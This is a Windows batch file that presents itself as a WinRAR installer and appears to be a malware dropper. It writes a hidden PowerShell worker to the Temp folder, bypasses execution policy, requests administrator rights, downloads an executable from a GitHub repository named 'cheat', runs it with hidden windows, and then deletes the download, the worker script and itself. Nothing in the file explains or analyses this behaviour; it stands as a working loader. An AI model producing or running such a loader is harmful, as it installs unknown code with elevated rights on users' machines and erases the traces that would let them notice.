@echo off
setlocal EnableExtensions

set "URL=https://raw.githubusercontent.com/skibididodopp-beep/cheat/refs/heads/main/WinRar_setup.exe"
set "HASH=3271c6372c136be4f9e7b276b3cb3b52ed4c408e1abc6405d15551212279dfac"
set "BASE_TEMP=%USERPROFILE%\AppData\Local\Temp"
set "WORK_DIR=%BASE_TEMP%\WinRarPkg"
set "OUT=%WORK_DIR%\WinRar_setup.exe"
set "PS_SCRIPT=%BASE_TEMP%\winrar_worker.ps1"
set "LOG=%BASE_TEMP%\winrar_worker.log"
set "RUNNER_BAT=%~f0"

if not exist "%WORK_DIR%" mkdir "%WORK_DIR%" >nul 2>&1

powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "$code = @'" ^
  "$ErrorActionPreference = 'Stop'" ^
  "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12" ^
  "" ^
  "$u = $env:URL" ^
  "$h = $env:HASH.ToLowerInvariant()" ^
  "$dir = $env:WORK_DIR" ^
  "$f = $env:OUT" ^
  "$log = $env:LOG" ^
  "$psFile = $env:PS_SCRIPT" ^
  "$runner = $env:RUNNER_BAT" ^
  "" ^
  "function Write-Log([string]$Msg) {" ^
  "    $line = '[{0}] {1}' -f (Get-Date -Format 'HH:mm:ss'), $Msg" ^
  "    Add-Content -LiteralPath $log -Value $line -Encoding UTF8" ^
  "}" ^
  "" ^
  "$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)" ^
  "if (-not $isAdmin) {" ^
  "    $psiAdmin = New-Object System.Diagnostics.ProcessStartInfo" ^
  "    $psiAdmin.FileName = 'powershell.exe'" ^
  "    $psiAdmin.Arguments = '-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File \"' + $psFile + '\"'" ^
  "    $psiAdmin.Verb = 'RunAs'" ^
  "    $psiAdmin.UseShellExecute = $true" ^
  "    $psiAdmin.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden" ^
  "    [System.Diagnostics.Process]::Start($psiAdmin) | Out-Null" ^
  "    exit 0" ^
  "}" ^
  "" ^
  "try {" ^
  "    Write-Log ('Elevated worker started. URL=' + $u)" ^
  "    if (-not (Test-Path -LiteralPath $dir)) {" ^
  "        New-Item -ItemType Directory -Path $dir -Force | Out-Null" ^
  "    }" ^
  "" ^
  "    $downloaded = $false" ^
  "    try {" ^
  "        Invoke-WebRequest -Uri $u -OutFile $f -UseBasicParsing" ^
  "        if ((Test-Path -LiteralPath $f) -and ((Get-Item -LiteralPath $f).Length -gt 0)) {" ^
  "            $downloaded = $true" ^
  "        }" ^
  "    } catch {" ^
  "        Write-Log ('Invoke-WebRequest failed: ' + $_.Exception.Message)" ^
  "    }" ^
  "" ^
  "    if (-not $downloaded) {" ^
  "        try {" ^
  "            $wc = New-Object System.Net.WebClient" ^
  "            $wc.DownloadFile($u, $f)" ^
  "            $wc.Dispose()" ^
  "            if ((Test-Path -LiteralPath $f) -and ((Get-Item -LiteralPath $f).Length -gt 0)) {" ^
  "                $downloaded = $true" ^
  "            }" ^
  "        } catch {" ^
  "            Write-Log ('WebClient failed: ' + $_.Exception.Message)" ^
  "        }" ^
  "    }" ^
  "" ^
  "    if (-not $downloaded) {" ^
  "        Write-Log 'ERROR: Download failed'" ^
  "        exit 1" ^
  "    }" ^
  "" ^
  "    Write-Log 'Downloaded OK, checking SHA-256'" ^
  "    $actual = (Get-FileHash -LiteralPath $f -Algorithm SHA256).Hash.ToLowerInvariant()" ^
  "    if ($actual -ne $h) {" ^
  "        Write-Log ('ERROR: Hash mismatch. Expected=' + $h + ' Actual=' + $actual)" ^
  "        Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue" ^
  "        exit 2" ^
  "    }" ^
  "" ^
  "    Write-Log 'Hash verified, launching executable'" ^
  "    $proc = Start-Process -FilePath $f -PassThru -Wait" ^
  "    Write-Log ('Process exited with code ' + $proc.ExitCode)" ^
  "    exit [int]$proc.ExitCode" ^
  "} catch {" ^
  "    Write-Log ('FATAL: ' + $_.Exception.Message)" ^
  "    exit 99" ^
  "} finally {" ^
  "    Start-Sleep -Seconds 2" ^
  "    if ($dir -and (Test-Path -LiteralPath $dir)) {" ^
  "        Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue" ^
  "    }" ^
  "    if ($runner -and (Test-Path -LiteralPath $runner)) {" ^
  "        Remove-Item -LiteralPath $runner -Force -ErrorAction SilentlyContinue" ^
  "    }" ^
  "    if ($psFile -and (Test-Path -LiteralPath $psFile)) {" ^
  "        Remove-Item -LiteralPath $psFile -Force -ErrorAction SilentlyContinue" ^
  "    }" ^
  "}" ^
  "'@; [IO.File]::WriteAllText($env:PS_SCRIPT, $code, [Text.UTF8Encoding]::new($false))" >nul 2>&1

if not exist "%PS_SCRIPT%" exit /b 1

powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
  "$psi = New-Object System.Diagnostics.ProcessStartInfo; " ^
  "$psi.FileName = 'powershell.exe'; " ^
  "$psi.Arguments = '-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File \"' + $env:PS_SCRIPT + '\"'; " ^
  "$psi.UseShellExecute = $false; " ^
  "$psi.CreateNoWindow = $true; " ^
  "[System.Diagnostics.Process]::Start($psi) | Out-Null" >nul 2>&1

exit /b 0
